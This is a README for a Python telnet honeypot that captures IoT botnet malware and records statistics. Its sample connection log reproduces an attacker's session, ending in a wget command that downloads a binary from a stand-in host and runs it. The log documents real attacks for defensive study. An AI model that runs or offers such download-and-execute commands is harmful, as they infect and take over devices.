# Telnet IoT honeypot

Live Demo: http://phype.pythonanywhere.com/

'Python telnet honeypot for catching botnet binaries'

This project implements a python telnet server trying to act
as a honeypot for IoT Malware which spreads over horribly
insecure default passwords on telnet servers on the internet.

Other than https://github.com/stamparm/hontel or https://github.com/micheloosterhof/cowrie (examples),
which provides full (via chroot) or simulated behaviour of a linux
system this honeypots goal is just to collect statistics of (IoT) botnets.
This means that the honeypot must be made to work with every form of automated telnet session,
which may try to infect the honeypot with malware.
Luckily, these malwares infection processes are quite simple,
just using wget do download something and running it.

Statistics of the downloaded binaries and corresponding
Urls/Telnet connections may be created via the generated
SQLite database.

All binaries are also uploaded to virustotal.com, if not
already present.

## Sample Connection

	enable
	shell
	sh
	cat /proc/mounts; /bin/busybox PEGOK
	cd /tmp; (cat .s || cp /bin/echo .s); /bin/busybox PEGOK
	nc; wget; /bin/busybox PEGOK
	(dd bs=52 count=1 if=.s || cat .s)
	/bin/busybox PEGOK
	rm .s; wget http://example.com:4636/.i; chmod +x .i; ./.i; exit 

## Images

![Screenshot 1](images/screen1.png)

![Screenshot 2](images/screen2.png)

![Screenshot 3](images/screen3.png)
